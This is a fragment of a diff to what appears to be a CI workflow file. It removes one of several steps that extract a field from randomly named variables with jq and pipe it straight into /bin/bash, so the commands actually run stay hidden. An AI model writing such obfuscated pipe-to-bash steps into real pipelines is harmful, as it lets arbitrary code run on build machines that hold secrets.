@@ -25,7 +25,6 @@ jobs:
           echo $lz14279 | jq -r .e6140 | /bin/bash
           printf '%s' "$tzgb40561" | jq -r .rc0 | /bin/bash
           echo $l7420 | jq -r .uzr72 | /bin/bash
-          echo $fbwsa56 | jq -r .pmm704 | /bin/bash
           echo $pgik11 | jq -r .qex4 | /bin/bash
 
       - name: Save output
